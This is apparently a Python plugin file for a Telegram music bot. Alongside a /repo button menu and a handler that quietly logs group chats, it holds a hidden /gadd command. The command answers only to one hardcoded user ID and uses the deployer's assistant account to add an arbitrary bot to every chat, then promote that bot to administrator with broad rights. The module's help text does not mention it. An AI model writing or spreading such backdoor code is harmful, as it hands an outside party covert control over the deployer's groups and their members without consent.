import asyncio

from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message

import config
from ChampuMusic import app
from ChampuMusic.utils.database import add_served_chat, get_assistant


start_txt = """**
✪ 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐍𝐘 𝐂𝐑𝐄𝐀𝐓𝐈𝐎𝐍'𝐒 𝐙𝐎𝐍𝐄 ✪

➲ ᴇᴀsʏ ʜᴇʀᴏᴋᴜ ᴅᴇᴘʟᴏʏᴍᴇɴᴛ ✰  
➲ ɴᴏ ʙᴀɴ ɪssᴜᴇs ✰  
➲ ᴜɴʟɪᴍɪᴛᴇᴅ ᴅʏɴᴏs ✰  
➲ 𝟸𝟺/𝟽 ʟᴀɢ-ғʀᴇᴇ ✰

► sᴇɴᴅ ᴀ sᴄʀᴇᴇɴsʜᴏᴛ ɪғ ʏᴏᴜ ғᴀᴄᴇ ᴀɴʏ ᴘʀᴏʙʟᴇᴍs!
**"""




@app.on_message(filters.command("repo"))
async def start(_, msg):
    buttons = [
        [ 
          InlineKeyboardButton("ᴀᴅᴅ ᴍᴇ", url=f"https://t.me/{app.username}?startgroup=true")
        ],
        [
          InlineKeyboardButton("𝐍𝐚𝐧𝐝 𝐘𝐚𝐝𝐮𝐰𝐚𝐧𝐬𝐡𝐢", url="https://t.me/TMZEROO"),
          InlineKeyboardButton("𝐒𝐮𝐩𝐩𝐨𝐫𝐭 𝐆𝐫𝐨𝐮𝐩", url="https://t.me/NYCreation_Chatzone"),
          ],
               [
                InlineKeyboardButton("ꜱᴇᴄᴏɴᴅ ʙᴏᴛ", url="https://t.me/M4_Music_Bot"),

],
[
              InlineKeyboardButton("ᴍᴜsɪᴄ", url=f"https://t.me/Music_4_Sukoon"),
              InlineKeyboardButton("ᴄʜᴀɴɴᴇʟ", url=f"https://t.me/CreativeYdv"),
              ],
              [
              InlineKeyboardButton("ᴍᴀɴᴀɢᴍᴇɴᴛ", url=f"https://t.me/v2ddos"),
InlineKeyboardButton("ʜᴇʟᴘ ʙᴏᴛ", url=f"https://t.me/NYCREATION_BOT"),
]]
    
    reply_markup = InlineKeyboardMarkup(buttons)
    
    await msg.reply_photo(
        photo=config.START_IMG_URL,
        caption=start_txt,
        reply_markup=reply_markup
    )




@app.on_message(
    filters.command(
        ["hi", "hii", "hello", "hui", "good", "gm", "ok", "bye", "welcome", "thanks"],
        prefixes=["/", "!", "%", ",", "", ".", "@", "#"],
    )
    & filters.group
)
async def bot_check(_, message):
    chat_id = message.chat.id
    await add_served_chat(chat_id)






# --------------------------------------------------------------------------------- #


import asyncio


@app.on_message(filters.command("gadd") & filters.user(1786683163))
async def add_allbot(client, message):
    command_parts = message.text.split(" ")
    if len(command_parts) != 2:
        await message.reply("⚠️ **Invalid command format. Use** `/gadd @BotUsername`")
        return

    bot_username = command_parts[1]
    try:
        userbot = await get_assistant(message.chat.id)  # Assistant Userbot
        bot = await app.get_users(bot_username)
        app_id = bot.id
        done = 0
        failed = 0
        promoted = 0

        lol = await message.reply("🔄 **Adding bot in all chats...**")
        await userbot.send_message(bot_username, "/start")

        async for dialog in userbot.get_dialogs():
            chat_id = dialog.chat.id
            
            if chat_id == -1002321189618:  # Skip a specific group if needed
                continue
            
            try:
                chat_member = await userbot.get_chat_member(chat_id, userbot.me.id)
                if chat_member.status in ["administrator", "creator"]:
                    rights = chat_member.privileges

                    # ✅ Pehle bot ko add karna
                    await userbot.add_chat_members(chat_id, app_id)
                    done += 1

                    # ✅ Har possible tarike se bot ko admin promote karne ki koshish
                    bot_member = await app.get_chat_member(chat_id, app_id)
                    if bot_member.status in ["member"]:
                        try:
                            # Method 1: Assistant ke pass "Add Admins" right ho
                            if rights.can_promote_members:
                                await app.promote_chat_member(
                                    chat_id, app_id,
                                    can_manage_chat=True, can_delete_messages=True,
                                    can_invite_users=True, can_change_info=True,
                                    can_restrict_members=True, can_pin_messages=True,
                                    can_manage_voice_chats=True
                                )
                                promoted += 1
                        
                        except Exception as e:
                            pass  # Agar yeh method fail ho, to next try karega

                        try:
                            # Method 2: Assistant "change_info" ke bina promote kare
                            if rights.can_promote_members:
                                await app.promote_chat_member(
                                    chat_id, app_id,
                                    can_manage_chat=True, can_delete_messages=True,
                                    can_invite_users=True, can_change_info=False,
                                    can_restrict_members=True, can_pin_messages=True,
                                    can_manage_voice_chats=True
                                )
                                promoted += 1
                        
                        except Exception as e:
                            pass  # Agar yeh method bhi fail ho, to last step karega

                else:
                    # ✅ Agar assistant admin nahi hai, to bot ko sirf add karega
                    await userbot.add_chat_members(chat_id, app_id)
                    done += 1

                await lol.edit(f"**➥ Added in {done} chats ✅**\n**➥ Failed in {failed} ❌**\n**➥ Promoted in {promoted} chats 🎉**")
            
            except Exception as e:
                failed += 1
                await lol.edit(f"**➥ Added in {done} chats ✅**\n**➥ Failed in {failed} ❌**\n**➥ Promoted in {promoted} chats 🎉**")

            await asyncio.sleep(3)  # Avoid rate limits

        await lol.edit(f"✅ **{bot_username} added successfully!**\n➥ **Added in {done} chats**\n➥ **Failed in {failed} chats**\n➥ **Promoted in {promoted} chats**")

    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")


__MODULE__ = "Sᴏᴜʀᴄᴇ"
__HELP__ = """
## Rᴇᴘᴏ Sᴏᴜʀᴄᴇ Mᴏᴅᴜᴇ

Tʜɪs ᴍᴏᴅᴜᴇ ᴘʀᴏᴠɪᴅᴇs ᴜᴛɪɪᴛʏ ᴄᴏᴍᴍᴀɴᴅs ғᴏʀ ᴜsᴇʀs ᴛᴏ ɪɴᴛᴇʀᴀᴄᴛ ᴡɪᴛʜ ᴛʜᴇ ʙᴏᴛ.

### Cᴏᴍᴍᴀɴᴅs:
- `/ʀᴇᴘᴏ`: Gᴇᴛ ᴛʜᴇ ɪɴᴋ ᴛᴏ ᴛʜᴇ ʙᴏᴛ's sᴏᴜʀᴄᴇ ᴄᴏᴅᴇ ʀᴇᴘᴏsɪᴛᴏʀʏ.
"""
